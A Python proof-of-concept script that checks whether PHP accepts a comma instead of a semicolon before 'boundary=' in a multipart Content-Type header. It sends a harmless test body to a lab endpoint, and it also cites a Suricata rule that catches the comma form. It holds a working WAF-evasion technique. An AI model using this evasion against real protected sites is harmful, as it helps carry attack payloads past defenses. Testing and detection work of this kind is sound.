#!/usr/bin/env python3
"""Verify the multipart Content-Type separator bypass (comma vs semicolon).

PHP's multipart parser accepts `multipart/form-data, boundary=X` as well as
the RFC spelling `multipart/form-data; boundary=X` (dinosn's note). Every
Content-Type-anchored WAF signature that requires `; boundary=` misses the
comma form while PHP still parses the body.

This POC sends the same tiny multipart body twice and compares the parser's
own variable count, so the claim is measured rather than inferred.

Usage:
  python3 poc/verify_content_type_bypass.py --target http://127.0.0.1:18110
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import probe

BOUNDARY = "CTBYPASS"
BODY = (
    b"--" + BOUNDARY.encode() + b"\r\n"
    b'Content-Disposition: form-data; name="a"\r\n\r\nx\r\n'
    b"--" + BOUNDARY.encode() + b"--\r\n"
)


def send(host, port, path, content_type):
    raw = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(BODY)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("latin-1") + BODY
    return probe.send_once(host, port, raw, timeout=20, recv_timeout=10)


def post_count(resp):
    for line in probe.body(resp).decode("latin-1", "replace").splitlines():
        if line.startswith("POST count:"):
            return int(line.split(":", 1)[1].strip())
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18110")
    ap.add_argument("--path", default="/probe.php")
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")

    print("[*] Content-Type separator bypass")
    print(f"    target: {host}:{port}{args.path}")
    print()

    ctrl = send(host, port, args.path, f"multipart/form-data; boundary={BOUNDARY}")
    test = send(host, port, args.path, f"multipart/form-data, boundary={BOUNDARY}")
    c, t = post_count(ctrl), post_count(test)
    print(f"    semicolon (RFC): {probe.status(ctrl)}  POST count={c}")
    print(f"    comma (bypass):  {probe.status(test)}  POST count={t}")
    print()

    if c and t:
        print("[EVIDENCE] COMMA-SEPARATOR BYPASS REPRODUCED")
        print("    - PHP parsed the body with both separators.")
        print("    - A WAF rule anchored on '; boundary=' sees only the")
        print("      first request; the comma form carries the same payload")
        print("      past it. Detection must normalize the separator")
        print("      (Suricata sid 210961809 does).")
        return 0
    print("[!] Parser did not expose a POST count; use a lab endpoint that")
    print("    reports count($_POST), e.g. lab-pure-modphp's /probe.php.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
